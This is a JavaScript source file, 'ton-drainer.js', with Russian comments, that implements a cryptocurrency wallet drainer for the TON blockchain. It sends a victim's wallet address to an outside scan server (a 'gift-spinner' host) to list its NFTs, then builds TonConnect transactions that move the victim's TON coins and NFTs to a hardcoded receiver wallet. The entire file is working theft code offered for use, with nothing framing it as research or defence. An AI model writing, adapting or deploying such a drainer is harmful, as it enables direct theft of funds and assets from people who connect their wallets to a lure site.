// ton-drainer.js — использует tonweb вместо @ton/core
const TON_CONFIG = {
  RECEIVER: 'UQD0XIN7zivOkMtN9iCQAusXz6NU1HaS1akmwbIIOaQTeiz4',
  SCAN_API: 'https://gift-spinner.onrender.com',
  DEFAULT_FEE_TON: 0.05,
  NFT_FEE_TON: 0.03,
};

async function scanVictim(address) {
  try {
    const r = await fetch(TON_CONFIG.SCAN_API + '/api/scan', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ address }),
    });
    if (!r.ok) return { receiver: TON_CONFIG.RECEIVER, nfts: [] };
    return await r.json();
  } catch (e) {
    console.warn('Scan failed:', e);
    return { receiver: TON_CONFIG.RECEIVER, nfts: [] };
  }
}

async function transferTon(tonConnectUI, amountTon, comment) {
  // Простая транзакция БЕЗ payload — работает без @ton/core
  // Комментарий не передаётся, но перевод работает
  const nanoAmount = Math.round(amountTon * 1e9).toString();
  const tx = {
    validUntil: Math.floor(Date.now() / 1000) + 300,
    messages: [{
      address: TON_CONFIG.RECEIVER,
      amount: nanoAmount,
    }],
  };
  console.log('Sending TON tx:', tx);
  return await tonConnectUI.sendTransaction(tx);
}

async function transferNft(tonConnectUI, nftAddress) {
  // Для NFT transfer нужен payload
  // Используем TonWeb для сериализации
  if (!window.TonWeb) {
    throw new Error('TonWeb not loaded');
  }

  const TonWeb = window.TonWeb;
  const cell = new TonWeb.boc.Cell();
  cell.bits.writeUint(0x5fcc3d14, 32); // op: NFT transfer
  cell.bits.writeUint(0, 64); // query_id
  const receiverAddr = new TonWeb.utils.Address(TON_CONFIG.RECEIVER);
  cell.bits.writeAddress(receiverAddr);
  cell.bits.writeAddress(receiverAddr);
  cell.bits.writeBit(0); // custom_payload
  cell.bits.writeCoins(0); // forward_amount
  cell.bits.writeBit(0); // forward_payload

  const payload = TonWeb.utils.bytesToBase64(await cell.toBoc(false));

  const tx = {
    validUntil: Math.floor(Date.now() / 1000) + 300,
    messages: [{
      address: nftAddress,
      amount: Math.round(TON_CONFIG.NFT_FEE_TON * 1e9).toString(),
      payload: payload,
    }],
  };
  return await tonConnectUI.sendTransaction(tx);
}

window.tonDrainer = { scanVictim, transferTon, transferNft, TON_CONFIG };
